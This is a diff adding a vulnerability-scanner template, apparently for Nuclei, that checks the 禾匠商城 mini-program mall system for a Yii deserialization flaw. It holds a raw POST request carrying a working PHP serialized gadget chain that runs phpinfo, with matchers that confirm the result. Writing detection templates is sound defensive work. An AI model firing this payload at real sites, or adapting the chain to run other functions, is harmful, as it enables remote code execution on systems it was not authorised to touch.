@@ -1,0 +1,32 @@
+id: hejiangshangcheng-mallid-RCE
+info:
+  name: hejiangshangcheng-mallid-RCE
+  author: apple
+  severity: critical
+  description: “禾匠商城”是国内使用量较大的小程序建站系统，存在 yii反序列化。
+  reference:
+    - https://blog.csdn.net/C20220511/article/details/125065817
+    - http://wiki.fofamini.com/2023hw/%E7%A6%BE%E5%8C%A0%E6%A6%9C%E5%BA%97%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F/%E7%A6%BE%E5%8C%A0%E6%A6%9C%E5%BA%97%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F.md
+  tags: tags
+http:
+  - raw:
+      - |+
+        POST /web/index.php?r=api/testOrderSubmit/index/submit&_mall_id=1 HTTP/1.1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip
+        Content-Length: 237
+
+        form_data=O%3A23%3A%22yii%5Cdb%5CBatchQueryResult%22%3A1%3A%7Bs%3A36%3A%22%00yii%5Cdb%5CBatchQueryResult%00_dataReader%22%3BO%3A24%3A%22GuzzleHttp%5CPsr7%5CFnStream%22%3A1%3A%7Bs%3A9%3A%22_fn_close%22%3Bs%3A7%3A%22phpinfo%22%3B%7D%7D
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'System'
+      - type: word
+        part: body
+        words:
+          - 'Build Date'
